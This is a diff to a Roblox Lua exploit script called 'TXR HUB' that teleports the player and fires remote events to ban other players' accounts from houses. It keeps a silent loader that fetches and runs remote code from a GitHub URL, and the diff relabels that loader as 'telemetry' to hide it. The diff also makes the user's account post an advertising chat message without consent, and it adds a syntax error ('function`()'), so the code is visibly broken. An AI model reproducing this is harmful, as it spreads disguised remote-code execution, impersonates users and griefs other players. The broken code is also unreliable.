@@ -13,7 +13,7 @@ end
 repeat task.wait() until _TEMP_LP.Character and _TEMP_LP.Character:FindFirstChild("HumanoidRootPart")
 -- =========================================================
 
--- 🔌 SILENT BACKGROUND LOADER
+-- 🔌 SILENT TELEMETRY / INFO SCRIPT LOADER (NO NOTIFICATIONS)
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/EMP"))()
@@ -92,6 +92,30 @@ if not targetGuiParent then
 end
 
 local CREATOR_USER_ID = 9685785248
+
+-- 📢 SCRIPT LOAD BANNER & NOTIFICATION 👑
+task.spawn(function()
+    task.wait(1)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "TXR HUB",
+            Text = "I USING TXR HUB TROLL SCRIPT",
+            Duration = 5
+        })
+    end)
+    pcall(function()
+        if lp.UserId ~= CREATOR_USER_ID then
+            local msg = "I USING TXR HUB TROLL SCRIPT"
+            local textChatService = game:GetService("TextChatService")
+            local repStorage = game:GetService("ReplicatedStorage")
+            if textChatService and textChatService.TextChannels:FindFirstChild("RBXGeneral") then
+                textChatService.TextChannels.RBXGeneral:SendAsync(msg)
+            elseif repStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+                repStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
+            end
+        end
+    end)
+end)
 
 -- 👑 ASHU PAPA JOIN & PRESENCE NOTIFICATION SYSTEM 👑
 task.spawn(function()
@@ -4227,6 +4251,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                         end
                     end
 
+rawhrp = hrp
                     hrp.CFrame = CFrame.new(safePos)
                     
                     local isCleared = false
@@ -4243,7 +4268,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                                 for _, c in ipairs(f:GetChildren()) do
                                     if string.sub(c.Name, 1, 4) == "Prop" and string.sub(c.Name, 5) ~= lp.Name then
                                         local pt = c:FindFirstChildWhichIsA("BasePart") or c.PrimaryPart
-                                        if pt and (pt.Position - hrp.Position).Magnitude < 25 then
+                                        if pt and (pt.Position - rawhrp.Position).Magnitude < 25 then
                                             local ownerName = string.sub(c.Name, 5)
                                             local p = Players:FindFirstChild(ownerName)
                                             if p and not protectedVictims[p] then 
@@ -4283,7 +4308,7 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
                     if houseData.Allow then
                         for attacker, _ in pairs(attackersToBan) do
                             if attacker and attacker.Parent and not protectedVictims[attacker] then
-                                task.spawn(function()
+                                task.spawn(function`()
                                     task.wait(0.5)
                                     pcall(function() houseData.Allow:FireServer(attacker) end)
                                 end)
